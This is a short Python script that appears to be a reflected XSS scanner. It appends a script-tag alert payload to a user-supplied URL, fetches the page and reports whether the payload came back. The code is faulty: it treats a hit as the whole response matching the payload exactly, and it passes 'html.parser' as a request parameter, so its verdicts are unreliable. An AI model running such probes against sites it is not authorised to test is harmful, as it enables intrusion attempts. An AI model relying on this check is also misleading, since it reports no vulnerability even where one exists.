import requests
Target = input("Target URL :")
payload = "<script>alert('XXS');</script>"
req = requests.get(Target+payload,"html.parser").text
if payload == req :
   print("Found vulnerability discovered")
else :
    print("Not Found") 
